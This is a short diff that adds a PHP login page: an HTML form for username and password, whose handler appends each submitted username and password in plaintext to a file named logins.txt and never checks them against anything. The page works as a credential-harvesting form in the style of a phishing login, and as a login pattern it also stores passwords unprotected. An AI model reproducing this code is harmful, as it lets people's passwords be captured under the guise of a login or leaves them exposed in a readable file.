@@ -1,0 +1,18 @@
+
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$file = 'logins.txt';
+$data = $username . ':' . $password . "\n";
+file_put_contents($file, $data, FILE_APPEND);
+?>
+<form method="post" action="login.php">
+  <label for="username">Username:</label>
+  <input type="text" name="username" id="username"><br>
+
+  <label for="password">Password:</label>
+  <input type="password" name="password" id="password"><br>
+
+  <input type="submit" value="Log in">
+</form>
